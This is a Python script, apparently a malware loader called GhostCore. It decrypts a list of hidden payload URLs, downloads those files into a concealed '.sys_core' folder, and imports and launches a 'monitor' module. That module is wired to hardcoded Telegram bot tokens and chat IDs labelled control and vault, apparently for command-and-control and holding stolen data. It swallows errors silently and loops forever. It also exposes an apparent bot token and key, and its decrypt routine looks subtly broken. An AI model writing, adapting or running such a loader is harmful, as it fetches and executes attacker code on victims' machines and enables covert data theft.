# -*- coding: utf-8 -*-
import os
import sys
import time
import json
import base64
import threading
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

try:
    from secrets import ENCRYPTION_KEY, BOT_TOKENS, CONTROL_ID, VAULT_ID
except ImportError:
    ENCRYPTION_KEY = b'MySup3rS3cr3tK3y1234567890123456'
    BOT_TOKENS = ["8369506331:AAFbMuU5NsVPWP9y977xG_lLaG1-pdGBs-Q"]
    CONTROL_ID = "-1003365166986"
    VAULT_ID = "-1003787520015"

PAYLOAD_URLS_ENCRYPTED = [
    "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"
]

def decrypt_url(enc):
    data = base64.b64decode(enc)
    iv, tag, ct = data[:12], data[-16:], data[12:-16]
    cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
    return (cipher.decryptor().update(ct) + cipher.decryptor().finalize()).decode()

class GhostCore:
    def __init__(self):
        self.work_dir = os.path.join(os.getcwd(), ".sys_core")
        os.makedirs(self.work_dir, exist_ok=True)
        sys.path.append(self.work_dir)

    def download_payloads(self):
        for enc in PAYLOAD_URLS_ENCRYPTED:
            url = decrypt_url(enc)
            name = url.split('/')[-1]
            try:
                r = requests.get(url, timeout=15)
                if r.status_code == 200:
                    with open(os.path.join(self.work_dir, name), 'w', encoding='utf-8') as f:
                        f.write(r.text)
            except:
                continue

    def start(self):
        self.download_payloads()
        try:
            import monitor
            monitor.start(BOT_TOKENS, CONTROL_ID, VAULT_ID)
        except:
            pass

if __name__ == "__main__":
    core = GhostCore()
    core.start()
    while True:
        time.sleep(60)
